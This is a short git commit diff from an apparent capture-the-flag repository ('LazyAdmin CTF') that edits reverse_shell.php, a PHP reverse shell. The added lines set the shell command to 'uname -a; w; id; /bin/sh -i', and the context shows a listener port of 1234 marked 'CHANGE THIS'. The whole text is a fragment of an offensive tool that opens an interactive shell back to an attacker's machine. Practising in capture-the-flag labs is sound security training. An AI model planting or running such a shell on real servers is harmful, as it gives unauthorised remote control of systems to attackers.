a87bae3e7c74610387006dbb461230806f7e346f
OmDorugade <73012018+OmDorugade@users.noreply.github.com>
2026-04-05 14:33:33 +0530

    Update reverse_shell.php

--- LazyAdmin CTF/reverse_shell.php
+++ LazyAdmin CTF/reverse_shell.php
@@ -6,7 +6,9 @@ $port = 1234;       // CHANGE THIS
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
-
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
 
 //
 // Daemonise ourself if possible to avoid zombies later
